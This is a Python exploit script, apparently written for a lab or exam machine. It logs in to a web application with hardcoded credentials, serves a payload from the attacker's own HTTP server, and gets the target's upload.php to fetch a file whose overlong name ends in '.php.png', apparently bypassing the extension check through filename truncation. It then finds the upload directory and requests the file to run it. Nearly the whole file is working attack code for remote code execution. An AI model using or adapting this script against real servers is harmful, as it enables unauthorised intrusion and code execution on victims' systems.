import os
import http.server
import threading
import requests
import time
from bs4 import BeautifulSoup as soupy
import re

web_dir = os.getcwd()
web_port = 42069
ip = '192.168.20.70'

proxies = {
    "http": "http://localhost:8080"
}

upload_url ="http://" + ip + ":" + str(web_port) + "/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php.png"

r = requests.get("http://192.168.20.147/login.php")

r = requests.post("http://192.168.20.147/login.php", data={'username': 'leo',
                                                    'password': 'leofire88'}
       )

cookies = r.cookies


def start_server():
    os.chdir(web_dir)
    server_address = ('0.0.0.0', web_port)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()


print(f"[*] Starting webserver in {web_dir} thread on port {web_port}")
thread = threading.Thread(target=start_server, daemon=True)
thread.start()

time.sleep(3)


r = requests.post("http://192.168.20.147/upload.php", data={'url': upload_url},
       cookies=cookies,
       proxies=proxies
       )

soup = soupy(r.text, features='html.parser')
a = soup.find_all('pre')[0]
print(a)
directory = re.findall(r"CMD: cd /var/www/html/exam1(/uploads/[\w\-]+);", str(a))

print(directory)
r = requests.get("http://192.168.20.147" + directory[0] + "/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php.png")

while True:
    pass